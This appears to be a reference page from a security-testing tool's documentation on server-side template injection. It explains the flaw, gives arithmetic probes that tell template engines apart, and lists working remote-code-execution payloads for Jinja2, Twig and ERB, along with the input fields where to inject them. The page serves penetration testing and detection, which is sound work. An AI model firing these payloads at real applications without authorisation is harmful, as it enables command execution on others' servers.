# Server-Side Template Injection (SSTI)

## Summary
User input is embedded into a server-side template that is then evaluated, letting an
attacker run template expressions — often escalating to remote code execution.

## How to test with this tool
- `scan_api` with `plugins:["ssti"]` injects a distinctive arithmetic expression across
  engines and confirms when the **computed result** appears (not the literal expression).
- Manual with `http_request`: inject a math probe and check the output:
  - `{{1337*1337}}` → `1787569` means evaluation (Jinja2/Twig/Nunjucks).
  - Use a distinctive product (not `7*7=49`) to avoid coincidental matches.

## Detection Payloads (try all)
```
{{7*7}}          → 49 = Jinja2 / Twig
${7*7}           → 49 = Freemarker / Velocity / Mako (all use ${...})
<%= 7*7 %>       → 49 = ERB (Ruby)
*{7*7}           → 49 = Spring Thymeleaf
{{7*'7'}}        → 7777777 = Jinja2 (Python string repetition); 49 = Twig (numeric coercion of '7'). Differentiates Jinja2 from Twig.
```

## RCE Payloads

**Jinja2 (Python/Flask):**
```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

**Twig (PHP/Symfony):**
```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

**ERB (Ruby):**
```ruby
<%= `id` %>
```

### Where to Test
```
Name/bio/description fields, email templates, invoice name, PDF generators,
URL path parameters, search queries reflected in results, HTTP headers reflected
```